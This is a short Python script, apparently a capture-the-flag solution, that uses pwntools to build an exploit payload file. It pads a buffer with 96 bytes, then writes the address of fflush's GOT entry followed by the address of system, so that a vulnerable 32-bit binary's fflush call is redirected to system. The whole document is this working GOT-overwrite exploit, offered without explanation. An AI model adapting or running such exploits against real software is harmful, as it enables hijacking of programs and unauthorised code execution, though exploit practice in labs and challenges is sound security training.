from pwn import *

system = 0x080485e3
fflush_got = 0x0804a004

with open('payload', 'wb+') as f:
    f.write(b'a' * 4 * 24 + p32(fflush_got) + f'{system}\n'.encode())
